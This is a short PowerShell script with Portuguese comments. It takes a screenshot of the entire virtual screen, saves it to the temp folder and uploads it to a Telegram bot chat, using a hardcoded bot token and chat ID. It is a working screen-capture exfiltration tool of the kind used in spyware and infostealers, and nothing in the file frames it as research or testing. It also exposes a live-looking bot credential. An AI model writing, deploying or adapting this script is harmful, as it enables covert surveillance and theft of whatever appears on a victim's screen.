# ================================
# CONFIGURAÇÃO
# ================================
$botToken = "8257776250:AAEkmHhOMnoxyeBvF8iY-LygAj7602hjgJo"
$chatId   = "5757392163"
$savePath = "$env:TEMP\screenshot.png"

# ================================
# FUNÇÃO: Tirar Screenshot
# ================================
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screenWidth  = [System.Windows.Forms.SystemInformation]::VirtualScreen.Width
$screenHeight = [System.Windows.Forms.SystemInformation]::VirtualScreen.Height
$screenLeft   = [System.Windows.Forms.SystemInformation]::VirtualScreen.Left
$screenTop    = [System.Windows.Forms.SystemInformation]::VirtualScreen.Top

$bitmap = New-Object System.Drawing.Bitmap($screenWidth, $screenHeight)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screenLeft, $screenTop, 0, 0, $bitmap.Size)

$bitmap.Save($savePath, [System.Drawing.Imaging.ImageFormat]::Png)

$graphics.Dispose()
$bitmap.Dispose()

Write-Host "Screenshot guardado em $savePath"

# ================================
# ENVIO PARA TELEGRAM
# ================================
$telegramUrl = "https://api.telegram.org/bot$botToken/sendPhoto"

$form = @{
    chat_id = $chatId
    photo   = Get-Item $savePath
}

Invoke-RestMethod -Uri $telegramUrl -Method Post -Form $form